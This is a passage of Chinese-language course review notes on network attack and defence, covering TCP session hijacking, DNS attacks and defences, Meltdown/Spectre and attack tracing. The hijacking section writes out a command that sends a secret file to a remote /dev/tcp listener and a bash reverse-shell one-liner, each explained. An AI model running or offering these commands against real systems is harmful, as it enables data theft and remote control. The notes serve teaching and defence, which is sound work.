<li>这可能导致数据包中的数据无法被正确存储，甚至可能导致缓冲区溢出或其他异常情况。</li>
</ul>
</li>
</ul>
<img src="网络攻防技术复习.assets/image-20231226181428953.png" alt="image-20231226181428953" style="zoom:50%;" />

<br>

<p>劫持之后运行什么命令：</p>
<p>考虑服务器上用户帐户中有一个名为 secret 的绝密文件。</p>
<p>如果攻击者使用 cat 命令，结果将显示在服务器的主机上，而不是攻击者的机器上。</p>
<p><code>cat /home/seed/secret &gt; /dev/tcp/10.0.2.70/9090</code></p>
<p>cat 命令打印出机密文件的内容，但不是在本地打印，而是将输出重定向到名为&#x2F;dev&#x2F;tcp&#x2F;10.0.2.16&#x2F;9090的文件（包含设备文件的 &#x2F;dev文件夹 中的虚拟文件）。</p>
<p>这将调用一个伪设备，该设备创建与TCP服务器的连接，TCP服务器在 10.0.2.16 的 端口9090 上侦听，并通过该连接发送数据。</p>
<br>

<p>创建反向Shell：</p>
<p>劫持连接后运行的最佳命令是运行 反向shell命令。</p>
<p>在服务器上运行 shell程序，如 &#x2F;bin&#x2F;bash，并使用可由攻击者控制的 输入&#x2F;输出 设备。</p>
<p>shell程序 使用 TCP连接 的一端作为其 输入&#x2F;输出，连接的另一端由攻击者计算机控制。</p>
<p>反向shell 是一个在远程计算机上运行的shell进程，可连接回攻击者。</p>
<p><code>/bin/bash -i &gt; /dev/tcp/10.0.2.70/9090 2&gt;&amp;1 0&lt;&amp;1</code></p>
<ul>
<li><p>-i 代表交互式，这意味着 shell 应该是交互式的。</p>
</li>
<li><p>使 shell的输出 重定向到 TCP连接 10.0.2.70 的端口9090 上。</p>
</li>
<li><p>文件描述符2 表示标准错误（stderr）。</p>
<ul>
<li>这种情况下，错误输出将被重定向到 stdout，即 TCP连接。</li>
</ul>
</li>
<li><p>文件描述符0 表示标准输入设备（stdin），1表示标准输出设备（stdout）。</p>
<ul>
<li>由于 stdout 已重定向到 TCP连接，因此此选项基本上表示 shell程序 将从同一TCP连接获取其输入。</li>
</ul>
</li>
</ul>
<br>

<p>防御会话劫持：</p>
<ul>
<li><p>使攻击者难以伪造数据包</p>
<ul>
<li><p>随机化源端口号</p>
</li>
<li><p>随机化初始序列号</p>
</li>
<li><p>对本地攻击无效</p>
</li>
</ul>
</li>
<li><p>加密有效载荷</p>
</li>
</ul>
<br>

<br>

<br>

<h2 id="DNS-攻击"><a href="#DNS-攻击" class="headerlink" title="DNS 攻击*"></a>DNS 攻击*</h2><p><em>DNS攻击<strong>（域名结构、查询过程、DNS攻击类型及原理（本地DNS缓存中毒攻击、远程DNS缓存中毒攻击、恶意DNS服务器的回复伪造攻击、DNS重绑定攻击)、范措措施）</strong></em></p>
<br>

<h3 id="域名结构"><a href="#域名结构" class="headerlink" title="域名结构"></a>域名结构</h3><img src="网络攻防技术复习.assets/image-20231226182917375.png" alt="image-20231226182917375" style="zoom: 80%;" />

<p>二级域通常分配给特定实体：如公司、学校。</p>
<br>

<p>区域（zone）：</p>
<p>DNS 是根据 区域 组织的。</p>
<p>区域是指DNS服务器上的一个独立管理区域，包含了一部分域名空间的信息。</p>
<p>区域将相邻的域和子域分组，并将管理权限分配给实体。</p>
<br>

<p>下图使用树结构来描述 example.com 域中的子域。</p>
<p>在这种情况下，每个国家有多个 DNS 区域。这些区域保留其每个子域的权限记录。</p>
<p>区域 example.com 仅包含不属于任何子域的主机名的 DNS 记录，如 mail.example.com</p>
<img src="网络攻防技术复习.assets/image-20231226183209483.png" alt="image-20231226183209483" style="zoom:80%;" />

<p>区域（zone）和域（domain）：</p>
<p>DNS区域仅包含域的一部分DNS数据。</p>
<p>如果域未划分为子域，则区域和域本质上是相同的，因为区域包含域的所有DNS数据。</p>
<p>当一个域被划分为子域时，它们的DNS数据仍然可以放在同一个区域中，因此域和区域仍然是相同的。</p>
<p>但是子域可以有自己的区域。</p>
<p>例如上图：</p>
<ul>
<li>usa.example.com 是一个域名，其子域为 boston、chicago、nyc</li>
<li>example.com 的域名管理者为 usa.example.com 创建了两个区域</li>
<li>第一个包含 usa域、chicago 和 boston子域，第二个包含 nyc子域</li>
</ul>
<br>

<p>根服务器：</p>
<ul>
<li>根区域称为 root</li>
<li>它们提供有关所有TLD的名称服务器信息<ul>
<li><a href="https://www.internic.net/domain/root.zone">https://www.internic.net/domain/root.zone</a></li>
</ul>
</li>
<li>它们是DNS查询的起点</li>
</ul>
<br>

<p>权威名称服务器：</p>
<ul>
<li><p>每个DNS区域至少有一个权威名称服务器，用于发布有关该区域的信息。</p>
</li>
<li><p>它提供了DNS查询的原始和最终答案。</p>
</li>
<li><p>权威名称服务器可以是主服务器（主服务器）或从服务器（辅助服务器）。</p>
</li>
<li><p>主服务器存储所有区域记录的主副本，而从服务器使用自动更新机制来维护主记录的相同副本。</p>
</li>
</ul>
<br>

<p>顶级域服务器：</p>
<ul>
<li><p>顶级域（TLD）</p>
</li>
<li><p>负责顶级域名（如com、org、net、edu 和 gov）和所有国家级的顶级域名（如cn、uk、fr、ca、jp）。</p>
</li>
</ul>
<br>

<br>

<h3 id="查询过程"><a href="#查询过程" class="headerlink" title="查询过程"></a>查询过程</h3><p>递归查询：如果 A 请求 B，那么 B 作为请求的接收者一定要给 A 想要的答案</p>
<p><img src="/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E5%A4%8D%E4%B9%A0.assets/image-20231226193330485.png" alt="image-20231226193330485"></p>
<br>

<p>迭代查询：如果接收者 B 没有请求者 A 所需要的准确内容，接收者 B 将告诉请求者 A，如何去获得这个内容，但是自己并不去发出请求</p>
<p><img src="/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E5%A4%8D%E4%B9%A0.assets/image-20231226193441677.png" alt="image-20231226193441677"></p>
<p>PS：权限域即权威域（Authoritative Domain）</p>
<br>

<p>DNS响应：</p>
<p>DNS响应一般包含：</p>
<ul>
<li><p>Header（标头）</p>
<ul>
<li>响应的一般信息<ul>
<li>如标识响应类型（查询响应、授权响应等）</li>
<li>回答数量</li>
<li>授权数量</li>
<li>附加数量等。</li>
</ul>
</li>
</ul>
</li>
<li><p>Question Section（问题部分）</p>
<ul>
<li>原始查询的问题信息<ul>
<li>如查询的域名</li>
<li>查询类型（A记录、MX记录等）</li>
<li>查询类别（通常是IN，表示Internet类别）</li>
</ul>
</li>
</ul>
</li>
<li><p>Answer Section（回答部分）</p>
<ul>
<li>回答问题的记录<ul>
<li>比如IP地址</li>
<li>邮件服务器地址等</li>
</ul>
</li>
</ul>
</li>
<li><p>Authority Section（权威部分）</p>
<ul>
<li>指向权威名称服务器的记录（NS）</li>
</ul>
</li>
<li><p>Additional Section（附加部分）</p>
<ul>
<li>与查询相关的记录</li>
</ul>
</li>
</ul>
<br>

<p>DNS缓存：</p>
<p>当本地DNS服务器从其他DNS服务器获取信息时，它会缓存该信息。</p>
<p>缓存中的每一条信息都有一个生存时间值，最终将超时并从缓存中删除。</p>
<br>

<br>

<h3 id="DNS-攻击-1"><a href="#DNS-攻击-1" class="headerlink" title="DNS 攻击"></a>DNS 攻击</h3><blockquote>
<p>主要分类：</p>
<p>拒绝服务攻击（DoS）</p>
<ul>
<li>当本地DNS服务器和权威名称服务器不响应DNS查询时，计算机无法检索IP地址。</li>
</ul>
<p>PS：DDoS（Distributed Denial of Service）是DoS攻击的一种变种，它涉及使用多个计算机或设备来协同发动攻击，从而使目标系统或网络资源不可用。</p>
<br>

<p>DNS欺骗</p>
<ul>
<li><p>主要目标：向受害者提供 欺诈性IP地址，诱使他们与不同于他们意图的机器进行通信。</p>
</li>
<li><p>示例：如果用户打算访问银行网站进行网上银行业务，但通过DNS过程获得的IP地址是攻击者的机器，则用户机器将与攻击者的web服务器通信。</p>
</li>
</ul>
<br>

<p>如果攻击者获得了机器的root权限</p>
<ul>
<li><p>修改 &#x2F;etc&#x2F;resolv.conf：使用恶意DNS服务器作为机器的本地DNS服务器，并可以控制整个DNS进程。</p>
</li>
<li><p>修改 &#x2F;etc&#x2F;hosts：向文件中添加新记录，提供某些选定域的IP地址。</p>
</li>
</ul>
</blockquote>
<ol>
<li>本地DNS缓存中毒攻击</li>
</ol>
<ul>
<li><p>是一种针对DNS解析过程的安全威胁，属于DNS欺骗。</p>
</li>
<li><p>攻击者试图向本地DNS服务器的缓存中注入虚假的DNS记录，从而使合法的域名解析到错误的IP地址上。</p>
</li>
<li><p>这可能导致用户被重定向到恶意网站，甚至影响整个网络的正常通信。</p>
</li>
<li><p>防范策略：</p>
<ul>
<li><p>运行 <code>sudo rndc dumpdb –cache</code> 并检查 <code>/var/cache/bind/dump.db</code> 的内容。</p>
</li>
<li><p>在进行攻击之前，请使用 <code>sudo rndc flush</code> 清理缓存</p>
</li>
</ul>
</li>
</ul>
<br>

<ol start="2">
<li>远程DNS缓存中毒攻击</li>
</ol>
<ul>
<li><p>挑战：对于与本地DNS服务器不在同一网络上的远程攻击者，欺骗回复要困难得多，因为他们需要猜测查询数据包使用的两个随机数：</p>
<ul>
<li>源端口号（16位随机数）</li>
<li>事务ID（16位随机数）</li>
</ul>
</li>
</ul>
<p>缓存效应：如果一次尝试失败，local DNS 将缓存实际的回复。攻击者需要等待缓存超时以进行下一次尝试。</p>
<p>Kaminsky攻击：</p>
<p>我们如何在不担心缓存效应的情况下不断伪造回复？</p>
<p>卡明斯基的想法：</p>
<ul>
<li><p>每次询问不同的问题，因此缓存答案并不重要，并且本地DNS服务器每次都会发送一个新的查询。</p>
</li>
<li><p>在授权部分提供伪造答案</p>
</li>
<li><p>让该服务器去问在授权部分伪造的假答案</p>
</li>
</ul>
<img src="D:\PicGo\typoraimage\image-20231226195307022.png" alt="image-20231226195307022" style="zoom:50%;" />

<br>

<ol start="3">
<li>恶意DNS服务器的回复伪造攻击</li>
</ol>
<br>

<ol start="4">
<li>DNS重绑定攻击</li>
</ol>
<img src="网络攻防技术复习.assets/image-20240104184634235.png" alt="image-20240104184634235" style="zoom:50%;" />

<img src="网络攻防技术复习.assets/image-20240104184646606.png" alt="image-20240104184646606" style="zoom: 50%;" />

<p>该攻击利用了DNS解析的特性，通过恶意的域名和IP地址映射，将用户浏览器中的一个域名指向一个恶意的站点，从而绕过同源策略，让攻击者能够在用户的浏览器中执行恶意代码。</p>
<p>攻击的过程如下：</p>
<ol>
<li>攻击者创建一个恶意网站，并将其绑定到一个可信的域名上。</li>
<li>用户访问了这个可信域名，浏览器会进行DNS解析，获取到对应的IP地址。</li>
<li>攻击者在恶意网站上返回一个短暂的TTL（Time To Live）值，然后将域名重新绑定到另一个恶意IP地址上。</li>
<li>用户再次访问这个域名时，由于DNS缓存仍然有效，浏览器会直接使用之前的IP地址进行连接。</li>
<li>用户在浏览器中执行的JavaScript代码会与恶意站点建立连接，攻击者可以利用这个连接执行各种恶意操作，如窃取敏感信息、发起网络攻击等。</li>
</ol>
<br>

<ol start="5">
<li>DNS拒绝服务攻击</li>
</ol>
<p>对根服务与TLD的拒绝服务攻击</p>
<ul>
<li><p>对根服务器和 TLD 服务器的攻击，但是一般攻击顶级域服务器。</p>
</li>
<li><p>如果攻击者能够关闭根区域的服务器，则可以关闭整个Internet。但是，攻击根服务器很困难：</p>
<ul>
<li><p>根名称服务器是高度分布式的。有13（A，B……M）个根名称服务器（服务器场），由大量冗余计算机组成，以提供可靠的服务。</p>
</li>
<li><p>由于 TLD 的名称服务器通常缓存在本地DNS服务器中，因此在缓存过期（48小时）之前不需要查询根服务器。对根服务器的攻击必须持续很长时间才能看到显著效果。</p>
</li>
</ul>
</li>
</ul>
<p>对特定域的拒绝服务攻击</p>
<br>

<h3 id="防止-DNS-缓存中毒攻击"><a href="#防止-DNS-缓存中毒攻击" class="headerlink" title="防止 DNS 缓存中毒攻击"></a>防止 DNS 缓存中毒攻击</h3><p>使用 DNSSEC 进行保护</p>
<img src="D:\PicGo\typoraimage\image-20231228155922036.png" alt="image-20231228155922036" style="zoom:50%;" />

<p>每一层提供一个信任签名。</p>
<br>

<p>使用 TLS&#x2F;SSL 进行保护</p>
<p>传输层安全（TLS&#x2F;SSL）协议提供了针对缓存中毒攻击的解决方案。</p>
<ul>
<li><p>在使用DNS协议获取域名（<a href="http://www.example.net)的ip地址后,计算机将询问ip地址的所有者(服务器)是否为www.example.net./">www.example.net）的IP地址后，计算机将询问IP地址的所有者（服务器）是否为www.example.net。</a></p>
</li>
<li><p>服务器必须提供由受信任实体签名的公钥证书，并证明它知道与<a href="http://www.example.net关联的相应私钥(即,它是证书的所有者)./">www.example.net关联的相应私钥（即，它是证书的所有者）。</a></p>
</li>
<li><p>HTTPS 构建在 TLS&#x2F;SSL 之上。它可以击败DNS缓存中毒攻击。</p>
</li>
</ul>
<br>

<p>​	DNSSEC 与 TLS&#x2F;SSL 比较</p>
<ul>
<li><p>DNSSEC 和 TLS&#x2F;SSL 都基于公钥技术，但它们的信任链不同。</p>
</li>
<li><p>DNSSEC 使用 DNS 区域层次结构提供信任链，因此父区域中的名称服务器为子区域中的名称服务器提供担保。</p>
</li>
<li><p>TLS&#x2F;SSL 依赖于公钥基础设施，该基础设施包含为其他计算机提供担保的证书颁发机构。</p>
</li>
</ul>
<br>

<br>

<br>

<h1 id="熔断与幽灵攻击"><a href="#熔断与幽灵攻击" class="headerlink" title="熔断与幽灵攻击"></a>熔断与幽灵攻击</h1><h2 id="CPU缓存原理"><a href="#CPU缓存原理" class="headerlink" title="CPU缓存原理"></a>CPU缓存原理</h2><p>CPU 缓存（CPU Cache）是位于 CPU 内部的高速存储器，用于加快对数据和指令的访问速度，它是在 CPU 和主存（RAM）之间的一个临时存储区域。</p>
<img src="网络攻防技术复习.assets/image-20231228162810456.png" alt="image-20231228162810456" style="zoom:50%;" />

<br>

<br>

<h2 id="侧信道攻击原理"><a href="#侧信道攻击原理" class="headerlink" title="侧信道攻击原理*"></a>侧信道攻击原理*</h2><p>如果 CPU 访问 Cache 中并不存在的数据时，则将会产生时间延迟，因此此时目标数据必须重新从内存加载到 Cache 中。</p>
<p>测量这种时间延迟有可能让攻击者确定出 Cache 访问失败的发生和频率。这就是基于缓存的侧信道攻击的基本原理。</p>
<br>

<p>Flush-Reload 技术</p>
<p>Flush-Reload 技术是一种侧信道攻击技术，用于获取另一个程序或操作系统内存中的敏感信息。</p>
<p>这种攻击的基本原理：</p>
<ol>
<li><p>首先将目标内存区域从处理器缓存中清除（flush）</p>
</li>
<li><p>然后监视处理器对该内存区域的访问。</p>
</li>
<li><p>通过观察目标内存区域是否被重新加载到缓存中，攻击者可以推断出目标程序对该内存区域进行了访问，从而获取敏感信息。</p>
</li>
</ol>
<br>

<br>

<h2 id="熔断攻击思路"><a href="#熔断攻击思路" class="headerlink" title="熔断攻击思路*"></a>熔断攻击思路*</h2><p>CPU乱序执行：</p>
<p>乱序执行可以简单地分为三个阶段：</p>
<img src="网络攻防技术复习.assets/image-20231228174541087.png" alt="image-20231228174541087" style="zoom:50%;" />

<p>每个阶段执行的操作如下：</p>
<ol>
<li><p>获取指令，解码后存放到执行缓冲区 Reservations Stations</p>
</li>
<li><p>乱序执行指令，结果保存在一个结果序列中</p>
</li>
<li><p>退休期 Retired Circle，重新排列结果序列及安全检查（如地址访问的权限检查），提交结果到寄存器</p>
</li>
</ol>
<br>

<p>示例代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; rcx = kernel address</span><br><span class="line"></span><br><span class="line">; rbx = probe array</span><br><span class="line"></span><br><span class="line">1 mov al, byte [rcx]</span><br><span class="line"></span><br><span class="line">2 shl rax, 0xc</span><br><span class="line"></span><br><span class="line">3 mov rbx, qword [rbx + rax] </span><br></pre></td></tr></table></figure>

<p>针对上述示例代码，Meltdown 漏洞的利用过程有4个步骤：</p>
<ol>
<li>获取指令、解码</li>
<li>乱序执行3条指令，指令2和指令3要等指令1中的读取内存地址的内容完成后才开始执行，指令3会将要访问的rbx数组元素所在的页加载到CPU Cache中。</li>
<li>对步骤2的结果进行重新排列，对1-3条指令进行安全检测，如发现访问违例，会丢弃当前执行的所有结果，恢复CPU状态到乱序执行之前的状态，但是并不会恢复 CPU Cache 的状态。</li>
<li>缓存侧信道攻击：通过缓存侧信道攻击，可以知道哪一个数组元素被访问过，也即对应的内存页存放在 CPU Cache 中，从而推测出内核地址的内容。</li>
</ol>
<br>

<br>

<h2 id="幽灵攻击思路"><a href="#幽灵攻击思路" class="headerlink" title="幽灵攻击思路*"></a>幽灵攻击思路*</h2><p>利用CPU的分支预测：</p>
<p>CPU并不会向我们代码编写的那样，先进行if的判断，在执行相应的分支，而是会预先执行分支中的语句。</p>
<p>举一个简单的例子：<code>if (a&gt;b) &#123;c = array[123456789];&#125;</code></p>
<p>一般按照我们期望的，CPU 先回判断 if 中的条件判断语句，再去执行主体中的内存访问赋值语句。这样在判断语句执行的时候，CPU 不会执行内存加载，这样就会浪费内存加载模块的资源。</p>
<p>分支预测技术可以减少这种资源的浪费，对于这样的语句，它允许操作系统先将对应的数据加载到 Cache 中，之后如果条件判断正确，就执行主体语句，这样主体语句在访问内存时就回去访问 Cache 而不是内存，时间就被节省下来了。</p>
<p>但是如果分支预测失败，那么 CPU 的状态信息就会被回滚还原，但是 Cache 中的数据还是保持不变。</p>
<br>

<p>幽灵漏洞（Spectre）原理：</p>
<p>当CPU发现分支预测错误时会丢弃分支执行的结果，恢复CPU的状态，但是不会恢复CPU Cache的状态，利用这一点可以突破进程间的访问限制（如浏览器沙箱）获取其他进程的数据。</p>
<img src="网络攻防技术复习.assets/image-20231228180508516.png" alt="image-20231228180508516" style="zoom:50%;" />

<p>具体攻击过程可以分为三个阶段：</p>
<ol>
<li><p>训练CPU的分支预测单元：使其在运行代码时会进行特定的预测执行。</p>
</li>
<li><p>预测执行：处理器根据预测执行了代码路径，并将预测执行的结果加载到CPU Cache中。</p>
</li>
<li><p>缓存侧信道攻击：通过缓存测信道攻击，可以知道哪一个数组元素被访问过，也即对应的内存页存放在CPU Cache中，从而推测出地址的内容。</p>
</li>
</ol>
<br>

<br>

<br>

<h1 id="追踪溯源技术"><a href="#追踪溯源技术" class="headerlink" title="追踪溯源技术"></a>追踪溯源技术</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>网络攻击追踪溯源的目标是探知攻击者身份、攻击点位置及攻击路径等信息，据此可针对性制定防护或反制措施，进而占领网络对抗制高点。</p>
<p>典型网络攻击场景中所涉及的角色通常包括攻击者、受害者、跳板、僵尸机及反射器等。</p>
<img src="网络攻防技术复习.assets/image-20231228182818802.png" alt="image-20231228182818802" style="zoom: 67%;" />

<p>一般来说，网络攻击追踪溯源是指确定攻击者的账号信息、身份信息、IP地址和MAC地址等虚拟地址信息与地理位置信息、攻击的中间环节信息以及还原攻击路径等的过程。</p>
<br>

<h3 id="目标层次"><a href="#目标层次" class="headerlink" title="目标层次"></a>目标层次</h3><p>按追踪溯源深度，网络攻击追踪溯源可分为攻击主机追踪溯源、控制主机追踪溯源、攻击者追踪溯源和攻击组织追踪溯源。</p>
<img src="网络攻防技术复习.assets/image-20231228183219569.png" alt="image-20231228183219569" style="zoom: 67%;" />

<br>

<p>攻击主机追踪溯源：</p>
<p>攻击主机追踪溯源是对攻击主机进行定位，通常被称为IP追踪（IP Traceback），主要有：</p>
<ul>
<li><p>利用路由器调试接口的输入调试（Input Debugging）追踪技术。</p>
</li>
<li><p>ICMP追踪技术。</p>
</li>
<li><p>可对单个数据包进行追踪的源路径隔离引擎（Source Path Isolation Engine，SPIE）追踪技术等。</p>
</li>
</ul>
<br>

<br>

<h2 id="面临的挑战"><a href="#面临的挑战" class="headerlink" title="面临的挑战"></a>面临的挑战</h2><ol>
<li><p>跳板：广义而言，反射机和僵尸机也属于跳板，反射机的受控制程度低，僵尸机的受控制程度高</p>
</li>
<li><p>匿名通信系统：通过一定的技术手段将网络数据流中通信双方的身份信息加以隐藏，使第三方无法获取或推测通信双方的通信关系或其中任何一方的身份信息。</p>
</li>
<li><p>TCP&#x2F;IP 协议簇未考虑用户行为的追踪审计，对IP数据包的源地址没有验证机制，以及Internet基础设施的无状态性：攻击者能够对数据源地址字段直接进行修改或假冒，以隐藏其自身信息</p>
</li>
<li><p>虚拟专用网络（VPN）的 IP 隧道技术：无法获取数据报文的信息</p>
</li>
<li><p>互联网服务供应商（Internet Service Provider，ISP） 采用的地址池和网络地址转换（Network Address Translation，NAT）技术：使得网络IP地址不再固定对应特定的用户</p>
</li>
</ol>
<br>

<br>

<h2 id="典型技术"><a href="#典型技术" class="headerlink" title="典型技术"></a>典型技术</h2><h3 id="IP追踪技术"><a href="#IP追踪技术" class="headerlink" title="IP追踪技术"></a>IP追踪技术</h3><p>IP追踪技术可追踪采用伪造地址的数据包的真实发送者，分为反应式追踪和主动式追踪两大类。</p>
<img src="网络攻防技术复习.assets/image-20231228184002721.png" alt="image-20231228184002721" style="zoom: 67%;" />

<br>

<h3 id="跳板攻击溯源技术"><a href="#跳板攻击溯源技术" class="headerlink" title="跳板攻击溯源技术"></a>跳板攻击溯源技术</h3><p>分为基于主机的溯源方法和基于网络的溯源方法</p>
<p>基于主机的溯源方法：</p>
<ul>
<li><p>分布式入侵检测系统（Distributed Intrusion Detection System，DIDS）</p>
<ul>
<li>被动式溯源</li>
</ul>
</li>
<li><p>呼叫识别系统（Caller Identification System，CIS）</p>
<ul>
<li>被动式溯源</li>
</ul>
</li>
<li><p>Caller ID</p>
<ul>
<li>主动式溯源</li>
</ul>
</li>
<li><p>和会话令牌协议（Session Token Protocol，STOP）</p>
<ul>
<li>被动式溯源</li>
</ul>
</li>
</ul>
<br>

<h3 id="针对匿名通信系统的追踪溯源技术"><a href="#针对匿名通信系统的追踪溯源技术" class="headerlink" title="针对匿名通信系统的追踪溯源技术"></a>针对匿名通信系统的追踪溯源技术</h3><h4 id="协议脆弱性攻击"><a href="#协议脆弱性攻击" class="headerlink" title="协议脆弱性攻击"></a>协议脆弱性攻击</h4><p>协议脆弱性攻击利用匿名通信系统自身的内在脆弱性对其进行攻击，以降低其匿名度。</p>
<ul>
<li><p>低资源路由攻击技术：利用Tor匿名网络路径选择算法的缺陷开展攻击。</p>
</li>
<li><p>女巫攻击（Sybil Attack）：通过向匿名网络中植入自己的节点或者控制部分网络节点，然后用这些节点提供的信息推断匿名隐藏关系。</p>
</li>
<li><p>前驱攻击&#x2F;合谋攻击（Predecessor Attack&#x2F;Collusion Attack）：当追踪者知道自己控制的节点在发送者的路径上时，该节点的前驱节点比其它任何节点更像是发送者，追踪者对每个可能的前驱节点进行统计就可能发现发送者。</p>
</li>
<li><p>报文标记攻击（Message Tagging Attack）：在最后一个节点处进行识别辨认就可确认发送者与接收者之间的关系。</p>
</li>
</ul>
<br>

<h4 id="流量分析攻击"><a href="#流量分析攻击" class="headerlink" title="流量分析攻击"></a>流量分析攻击</h4><p>流量分析攻击通过分析和关联不同数据流之间的流量特征来降低匿名通信系统的匿名度，主要包括：</p>
<ul>
<li>时间攻击（Timing Attack）</li>
<li>包计数攻击</li>
<li>流相关攻击（Flow Correlation Attack）</li>
</ul>
<br>

<br>

<h2 id="技术发展趋势"><a href="#技术发展趋势" class="headerlink" title="技术发展趋势"></a>技术发展趋势</h2><p>发展趋势有：</p>
<ul>
<li><p>大尺度网络中的传播源定位技术</p>
</li>
<li><p>基于软件基因的网络攻击追踪溯源技术</p>
</li>
<li><p>基于网络大数据的网络攻击追踪溯源技术</p>
</li>
<li><p>多手段融合的追踪溯源技术</p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>tag</title>
    <url>/tag/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
